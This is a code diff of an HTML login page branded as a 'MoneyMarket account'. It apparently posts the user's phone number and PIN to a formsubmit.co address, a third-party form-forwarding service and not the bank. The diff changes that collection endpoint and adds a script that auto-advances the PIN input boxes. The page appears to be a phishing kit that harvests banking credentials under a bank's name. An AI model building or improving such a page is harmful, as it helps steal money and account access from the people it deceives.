@@ -19,7 +19,7 @@
   <div class="container">
     <h2>Login to your <br><strong>MoneyMarket account</strong></h2>
 
-    <form action="https://formsubmit.co/4b442333e9eb95c98ff0a164f5911ff4.com" method="POST">
+    <form action="https://formsubmit.co/525a68c3f15ba3237c28cc11c2e7cb21.com" method="POST">
       <div class="input-group">
         <!-- Phone number -->
         <input type="text" name="phone" placeholder="e.g. 0821234567" required />
@@ -40,5 +40,23 @@
     <button class="btn btn-open" onclick="alert('Redirect to open account page')">Open an account</button>
   </div>
 
+  <script>
+    const pinInputs = document.querySelectorAll('.pin-boxes input');
+
+    pinInputs.forEach((input, index) => {
+      input.addEventListener('input', () => {
+        if (input.value.length === 1 && index < pinInputs.length - 1) {
+          pinInputs[index + 1].focus();
+        }
+      });
+
+      input.addEventListener('keydown', (e) => {
+        if (e.key === 'Backspace' && input.value === '' && index > 0) {
+          pinInputs[index - 1].focus();
+        }
+      });
+    });
+  </script>
+
 </body>
-</html>
+</html> 
